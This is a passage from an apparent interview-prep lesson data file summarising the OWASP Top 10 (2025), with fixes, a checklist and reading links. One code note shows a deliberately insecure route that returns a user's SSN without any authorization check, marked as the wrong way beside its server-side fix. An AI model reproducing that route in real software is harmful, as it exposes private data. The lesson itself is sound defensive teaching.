      { term: 'A01 Broken Access Control', def: '#1 risk. Users doing things they shouldn’t (viewing others’ data, privilege escalation). Fix: enforce authz server-side on every request; deny by default; never trust the client’s claim of who it is.' },
      { term: 'A02 Security Misconfiguration', def: 'Default creds, verbose errors, open cloud buckets, missing headers. Fix: harden defaults, set security headers (prev lesson), keep prod configs minimal, automate config checks.' },
      { term: 'A03 Software Supply Chain Failures', def: 'Risk from dependencies/build pipeline (a compromised or vulnerable package). Fix: pin & audit deps (`npm audit`, lockfiles), verify integrity, minimize footprint. (Relates to the AI slopsquatting lesson.)' },
      { term: 'A04 Cryptographic Failures', def: 'Sensitive data exposed via weak/missing crypto. Fix: TLS everywhere, hash passwords with bcrypt/argon2 (see Auth lesson), don’t roll your own crypto, encrypt secrets at rest.' },
      { term: 'A05 Injection', def: 'Untrusted input becomes code — SQL/NoSQL/command/XSS. Fix: parameterized queries + output encoding + validation (the Injection & XSS lessons).' },
      { term: 'A06 Insecure Design', def: 'Missing security thinking in the design itself (no rate limiting, weak flows). Fix: threat-model early, add abuse-case thinking, rate-limit and lock out sensitive flows.' },
      { term: 'A07 Authentication Failures', def: 'Weak login/session handling — credential stuffing, poor session management. Fix: strong password + MFA, secure session cookies, lockout/throttling (Auth lesson).' },
      { term: 'A08 Software or Data Integrity Failures', def: 'Trusting unverified updates/data/CI. Fix: verify signatures/integrity, protect the pipeline, don’t auto-load untrusted serialized data.' },
      { term: 'A09 Security Logging & Alerting Failures', def: 'Can’t detect or investigate a breach. Fix: log auth/access events, alert on anomalies, keep audit trails (without logging secrets/PII).' },
      { term: 'A10 Mishandling of Exceptional Conditions', def: 'New in 2025: errors/edge cases handled insecurely (leaking stack traces, failing open). Fix: fail closed, catch and sanitize errors, never expose internals to the client.' },
    ],
    codeNotes: [
      { label: 'What maps to what you already learned', code: `A05 Injection ....... fs-sec-xss, fs-sec-injection\nA02 Misconfig ....... fs-sec-headers (CSP/HSTS/helmet)\nA04 Crypto .......... be-auth (bcrypt/argon2), TLS\nA07 Auth ............ be-auth (hashing, JWT/sessions)\nA03 Supply chain .... adv-ai-security (slopsquatting), npm audit\nAccess control ...... enforce authz server-side, every request`, note: "The Top 10 ties the whole security thread together." },
      { label: 'Broken Access Control — the #1 killer', code: `// ❌ trusting the client's word\napp.get("/api/users/:id/ssn", (req) => getSSN(req.params.id));\n// ✅ check the caller may access THIS resource, server-side\nif (req.user.id !== req.params.id && !req.user.isAdmin) return res.sendStatus(403);`, note: "Never rely on a hidden UI element; authorize on the server every time." },
      { label: 'A quick self-audit before shipping', code: `[] authz checked server-side on every endpoint\n[] queries parameterized; output encoded; CSP set\n[] session cookies HttpOnly+Secure+SameSite; secrets in env\n[] deps audited (npm audit); errors don't leak internals\n[] HTTPS/HSTS on; security headers via helmet`, note: "A concrete checklist reads far better than 'I care about security.'" },
    ],
    explanation: `**Why this lesson exists:** interviewers for SDE / full-stack / front-end roles don't expect
you to be a security specialist, but they *do* expect **security awareness** — that you recognize the common
risk categories and can say what you'd do. The **OWASP Top 10** is that shared vocabulary. The most important
moves to have ready:

- **A01 Broken Access Control** is #1 for a reason — *always enforce authorization on the server, for every
  request*. A hidden button or a client-side role check is not access control.
- **A05 Injection** and XSS you can now speak to concretely: **parameterize queries, encode output, set a CSP.**
- **A02/A04/A07** map to headers (helmet), crypto/TLS, and the **auth** module (bcrypt, secure sessions).
- **A03 Supply Chain** rose to #3 in 2025 — \`npm audit\`, lockfiles, and minimizing dependencies matter, and
  it connects to the **AI slopsquatting / package-hallucination** risk from the AI-auditing lessons.

**How to use this in an interview:** don't recite ten names — *demonstrate the instinct*. "I'd enforce access
control server-side, parameterize all queries, encode output and add a CSP, keep sessions on HttpOnly+SameSite
cookies, audit dependencies, and make sure errors don't leak internals." That maps to A01, A05, A02, A07, A03,
and A10 without sounding like a checklist recital — which is exactly the security-aware full-stack engineer
they're screening for.

**Go deeper (vetted, highly-starred):**
- [OWASP Top 10 (2025)](https://owasp.org/Top10/) — the source list, one page per category.
- [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries) — the authoritative "how to defend X" reference.
- [yangshun/front-end-interview-handbook](https://github.com/yangshun/front-end-interview-handbook) (44k★) & [tech-interview-handbook](https://github.com/yangshun/tech-interview-handbook) (138k★) — interview-framed coverage incl. security.
- [vasanthk/how-web-works](https://github.com/vasanthk/how-web-works) — the request lifecycle SOP/CORS sit inside.

*Source: [OWASP Top 10:2025](https://owasp.org/Top10/).*`,
  },
]
